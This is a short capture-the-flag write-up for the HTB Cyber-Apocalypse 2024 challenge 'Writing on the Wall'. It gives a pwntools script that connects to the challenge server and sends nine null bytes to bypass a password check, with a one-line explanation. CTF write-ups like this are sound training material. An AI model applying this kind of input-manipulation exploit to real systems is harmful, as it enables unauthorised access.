# HTB Cyber-Apocalypse 2024 - Writing on the Wall


As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door's secrets?

<!--more-->

```python
from pwn import *
#nc 83.136.251.235 53824
# Start the process
#p = process('./writing_on_the_wall')
p = remote('83.136.251.235',53824)
#gdb.attach(p, gdbscript="b *main+77\n continue")

print(p.recv().decode())

# Send the payload without a newline
p.send(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00')


print(p.recvall().decode())
```

## Explanation

9 null bytes to manipulate the data 

